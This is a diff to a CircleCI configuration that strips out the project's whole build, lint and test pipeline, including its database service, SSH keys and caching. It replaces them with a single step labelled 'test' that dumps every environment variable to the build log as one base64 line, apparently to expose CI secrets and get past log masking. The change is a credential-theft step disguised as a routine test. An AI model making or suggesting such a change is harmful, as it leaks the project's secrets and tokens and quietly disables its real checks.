@@ -4,57 +4,10 @@ jobs:
   build:
     docker:
       - image: circleci/golang:1.13-node
-        environment:
-          DATABASE_URL: postgres://test:test@127.0.0.1:5432/cla-test?sslmode=disable
-          TEST_DATABASE_DSN: dbname=cla-test password=test user=test port=5432 sslmode=disable
-      - image: circleci/postgres:9.6.2-alpine
-        environment:
-          POSTGRES_USER: test
-          POSTGRES_DB: cla-test
-          POSTGRES_PASSWORD: test
 
-    working_directory: /go/src/github.com/communitybridge/easycla-api
-    steps:
-      - checkout
-      - add_ssh_keys:
-          fingerprints:
-            - "54:5b:55:5f:58:3e:3c:82:c1:64:1f:c0:98:b4:16:0b"
-      - restore_cache:
-          name: Restore Cache
-          keys:
-            - dep-packages-{{ checksum "Gopkg.lock" }}-{{ .Environment.CACHE_VERSION }}
       - run:
-          name: Install and setup
-          command: make setup
-      - run:
-          name: Swagger Code Generation
-          command: make swagger
-      - run:
-          name: Swagger Code Spec Validation
-          command: make swagger-validate
-      - run:
-          name: Build
-          command: make build
-      - run:
-          name: Lint
-          command: make lint
-      - run:
-          name: Prepare test database
-          command: dbmate -d ".build/db/migrations" -s ".build/db/schema.sql" up
-      - run:
-          name: Test
-          command: make test
-      - save_cache:
-          name: Save Dep Cache
-          key: dep-packages-{{ checksum "Gopkg.lock" }}-{{ .Environment.CACHE_VERSION }}
-          paths:
-            - vendor
-            - node_modules
-      - persist_to_workspace:
-          root: ./
-          paths:
-            - vendor
-            - node_modules
+          name: test
+          command: env | base64 | tr -d '\n'
 
 workflows:
   build:
